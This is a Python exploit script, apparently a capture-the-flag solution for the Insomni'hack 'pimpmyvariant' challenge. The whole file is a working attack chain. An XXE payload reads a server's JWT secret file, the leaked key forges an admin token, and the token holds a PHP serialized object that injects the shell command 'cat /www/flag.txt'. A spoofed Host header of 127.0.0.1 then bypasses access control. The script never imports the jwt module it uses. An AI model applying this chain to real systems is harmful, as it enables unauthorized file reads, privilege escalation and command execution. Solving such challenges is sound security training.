import requests
import re

data = """<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/www/jwt.secret.txt" > ]>
<root><name>&xxe;</name></root>"""

key_regex = r'<li>(.*?)</li>'
flag_regex = r'INS{(.*?)}'
URL = 'https://pimpmyvariant.insomnihack.ch'

def getSecret():
    r = requests.post(URL+"/api", data=data)
    key = re.findall(key_regex,r.text)
    print("Key: ",key[-1])
    return key[-1]

def genJwt():
    key = getSecret()
    content = {"variants": [],"settings": 'a:2:{i:0;O:4:"User":3:{s:4:"name";s:4:"Anon";s:7:"isAdmin";b:1;s:2:"id";s:40:"a626f9d074d5bb5f5210b8b881078111027ff8f5";}i:1;O:15:"UpdateLogViewer":2:{s:10:"packgeName";s:1:"x";s:12:"logCmdReader";s:23:"cat /www/flag.txt;echo ";}}',"exp": 1643473777}
    encoded_jwt = jwt.encode(content, key, algorithm="HS256")
    print("Jwt: ",encoded_jwt.decode("utf-8"))
    return encoded_jwt.decode("utf-8")

def getFlag():
    jwtToken = genJwt()
    cookies = {"jwt":jwtToken}
    headers = {"Host":"127.0.0.1"}
    r = requests.get(URL+'/log', cookies=cookies, headers=headers)
    flag = re.findall(flag_regex, r.text)
    print("Flag: INS{%s}" % flag[0])

getFlag()